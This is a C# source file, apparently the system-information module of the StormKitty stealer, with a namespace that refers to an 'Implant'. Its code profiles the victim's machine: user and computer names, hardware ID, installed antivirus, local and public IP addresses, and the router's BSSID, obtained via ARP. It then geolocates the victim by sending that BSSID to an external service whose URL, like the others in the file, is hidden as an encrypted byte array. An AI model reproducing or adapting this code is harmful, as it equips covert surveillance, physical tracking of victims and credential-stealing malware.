using Microsoft.Win32;
using System;
using System.Net;
using System.Linq;
using System.Drawing;
using System.Management;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using StormKitty.Implant;

namespace StormKitty
{
    internal sealed class SystemInfo
    {
        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);
        

        // Username
        public static string username = Environment.UserName;
        // Computer name
        public static string compname = Environment.MachineName;
        // Language
        public static string culture = System.Globalization.CultureInfo.CurrentCulture.ToString();
        // Current date
        public static string datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");

        // Get screen metrics
        public static string ScreenMetrics()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            int width = bounds.Width;
            int height = bounds.Height;
            return width  + "x" + height;
        }

        // Get battery status
        public static string GetBattery()
        {
            try
            {
                string batteryStatus = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
                string[] batteryLife = SystemInformation.PowerStatus.BatteryLifePercent.ToString().Split(',');
                string batteryPercent = batteryLife[batteryLife.Length - 1];
                return $"{batteryStatus} ({batteryPercent}%)";
            } catch { }
            return "Unknown";
        }

        // Get system version
        private static string GetWindowsVersionName()
        {
            string sData = "Unknown System";
            try
            {
                using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem"))
                {
                    foreach (ManagementObject tObj in mSearcher.Get())
                        sData = Convert.ToString(tObj["Name"]);
                    sData = sData.Split(new char[] { '|' })[0];
                    int iLen = sData.Split(new char[] { ' ' })[0].Length;
                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
                }
            }
            catch { }
            return sData;
        }

        // Get bit
        private static string GetBitVersion()
        {
            try
            {
                if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0")
                    .GetValue("Identifier")
                    .ToString()
                    .Contains("x86"))
                    return "(32 Bit)";
                else
                    return "(64 Bit)";
            } catch { }
            return "(Unknown)";
        }

        // Get system version
        public static string GetSystemVersion()
        {
            return GetWindowsVersionName() + " " + GetBitVersion();
        }

        // Get HWID
        public static string GetHardwareID()
        {
            try
            {
                var mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
                ManagementObjectCollection mbsList = mbs.Get();
                foreach (ManagementObject mo in mbsList)
                    return mo["ProcessorId"].ToString();
            } catch { }
            return "Unknown";
        }

        // Get default gateway
        public static string GetDefaultGateway()
        {
            try
            {
                return NetworkInterface
                .GetAllNetworkInterfaces()
                .Where(n => n.OperationalStatus == OperationalStatus.Up)
                .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
                .Select(g => g?.Address)
                .Where(a => a != null)
                .FirstOrDefault()
                .ToString();
            } catch { }

            return "Unknown";
        }

        // Detect antiviruse
        public static string GetAntivirus()
        {
            try
            {
                using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
                {
                    List<string> av = new List<string>();
                    foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
                        av.Add(searchResult["displayName"].ToString());
                    if (av.Count == 0) return "Not installed";
                    return string.Join(", ", av.ToArray()) + ".";
                }
            } catch { }
            return "N/A";
        }

        // Get local IP
        public static string GetLocalIP()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                        return ip.ToString();
            } catch { }

            return "No network adapters with an IPv4 address in the system!";
        }

        // Get public IP
        public static string GetPublicIP()
        {
            try
            {
                string externalip = new WebClient()
                .DownloadString(
                    StringsCrypt.Decrypt(new byte[] { 172, 132, 62, 84, 188, 245, 252, 173, 117, 82, 97, 91, 237, 238, 214, 39, 28, 15, 241, 23, 15, 251, 204, 131, 247, 237, 166, 92, 82, 85, 22, 172, }))
                .Replace("\n", "");
                return externalip;
            } catch { }
            return "Request failed";
        }

        // Get router BSSID
        private static string GetBSSID()
        {
            byte[] macAddr = new byte[6];
            uint macAddrLen = (uint)macAddr.Length;
            try
            {
                string ip = GetDefaultGateway();
                if (SendARP(BitConverter.ToInt32(IPAddress.Parse(ip).GetAddressBytes(), 0), 0, macAddr, ref macAddrLen) != 0) {
                    return "unknown";
                } else {
                    string[] v = new string[(int)macAddrLen];
                    for (int j = 0; j < macAddrLen; j++)
                        v[j] = macAddr[j].ToString("x2");
                    return string.Join(":", v);
                }
            } catch { }
            return "Failed";
        }

        // Get location by BSSID
        // Example API response:
        // {"result":200, "data":{"lat": 45.22172742372, "range": 156.997, "lon": 16.54707889397, "time": 1595238766}}
        public static string GetLocation()
        {
            string result;
            string response;
            string bssid = GetBSSID(); // "00:0C:42:1F:65:E9";
            string lat = "Unknown";
            string lon = "Unknown";
            string range = "Unknown";
            // Get coordinates by bssid
            try
            {
                using (WebClient client = new WebClient())
                    response = client.DownloadString(
                        StringsCrypt.Decrypt(new byte[] { 91, 185, 159, 48, 60, 79, 139, 159, 124, 37, 212, 232, 253, 2, 176, 189, 141, 243, 199, 107, 13, 252, 71, 66, 122, 29, 213, 176, 205, 11, 172, 67, 107, 43, 94, 178, 129, 142, 99, 210, 172, 1, 13, 123, 158, 81, 183, 66, 255, 162, 185, 157, 75, 7, 48, 125, 76, 21, 246, 190, 35, 164, 108, 141, }) + bssid);
            }
            catch
            {
                return "BSSID: " + bssid;
            }
            // If failed to receive BSSID location
            if (!response.Contains("{\"result\":200"))
                return "BSSID: " + bssid;
            // Get values
            int index = 0;
            string[] splitted = response.Split(' ');
            foreach (string value in splitted)
            {
                index++; // +1
                if (value.Contains("\"lat\":"))
                    lat = splitted[index]
                        .Replace(",", ""); ;
                if (value.Contains("\"lon\":"))
                    lon = splitted[index]
                        .Replace(",", ""); ;
                if (value.Contains("\"range\":"))
                    range = splitted[index]
                        .Replace(",", "");
            }
            result = $"BSSID: {bssid}\nLatitude: {lat}\nLongitude: {lon}\nRange: {range}";
            // Google maps
            if (lat != "Unknown" && lon != "Unknown")
                result += $"\n[Open google maps]({StringsCrypt.Decrypt(new byte[] { 206, 105, 162, 71, 154, 101, 143, 133, 216, 233, 4, 78, 251, 231, 127, 197, 50, 50, 5, 167, 22, 30, 67, 50, 30, 134, 116, 165, 251, 47, 202, 115, 111, 224, 166, 249, 5, 156, 140, 131, 223, 55, 212, 39, 236, 254, 69, 45, })}{lat} {lon})";

            return result;
        }

        // Get CPU name
        public static string GetCPUName()
        {
            try {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (ManagementObject mObject in mSearcher.Get())
                    return mObject["Name"].ToString();
            }
            catch { }
            return "Unknown";
        }

        // Get GPU name
        public static string GetGPUName()
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (ManagementObject mObject in mSearcher.Get())
                    return mObject["Name"].ToString();
            }
            catch { }
            return "Unknown";
        }

        // Get RAM
        public static string GetRamAmount()
        {
            try
            {
                int RamAmount = 0;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
                        RamAmount = (int)(Bytes / 1048576);
                        break;
                    }
                }
                return RamAmount.ToString() + "MB";
            }
            catch { }
            return "-1";
        }

        

    }
}
